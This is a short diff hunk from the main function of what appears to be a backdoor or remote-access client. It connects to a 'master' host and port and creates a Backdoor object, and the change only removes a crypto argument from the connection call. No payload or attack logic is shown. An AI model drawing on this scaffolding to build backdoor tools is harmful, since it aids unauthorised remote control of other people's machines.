@@ -9,7 +9,7 @@ def main():
     cli = CLI()
     crypto = Crypto()
 
-    connection = Connection(cli.master_hostname, cli.master_port, crypto)
+    connection = Connection(cli.master_hostname, cli.master_port)
     conn = connection.connect_master()
 
     backdoor = Backdoor(connection.conn, cli.master_hostname, cli.master_port, crypto)
